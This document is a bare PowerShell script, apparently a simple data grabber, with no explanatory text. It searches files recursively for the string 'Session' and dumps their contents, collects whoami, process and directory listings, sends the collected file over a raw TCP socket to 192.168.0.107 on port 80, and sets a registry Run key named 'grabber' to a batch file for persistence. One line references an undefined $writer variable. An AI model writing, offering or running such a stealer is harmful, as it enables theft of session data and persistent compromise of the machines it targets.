Get-ChildItem -Recurse | Where-Object {(Select-String -InputObject $_ -Pattern 'Session' -Quiet) -eq $true} | ForEach-Object {Write-Output $_; Get-Content $_} | Out-File -FilePath ./Process2.txt 

whoami | Out-File -FilePath ./Process5.txt -Append

Start-Sleep -Seconds 1.5

ps | Out-File -FilePath ./Process5.txt -Append

Start-Sleep -Seconds 1.5

ls | Out-File -FilePath ./Process5.txt -Append


#start http post 

$test=[io.file]::ReadAllBytes("Process2.txt");
$socket = New-Object net.sockets.tcpclient('192.168.0.107',80);
$stream = $socket.GetStream();
$stream.write($test,0,$test.Length);
$writer.flush();
$socket.close()



#set registry

New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
    -Name "grabber" `
    -Value "C:\Documents\#simple download.bat"

Start-Sleep -Seconds 1.5
exit


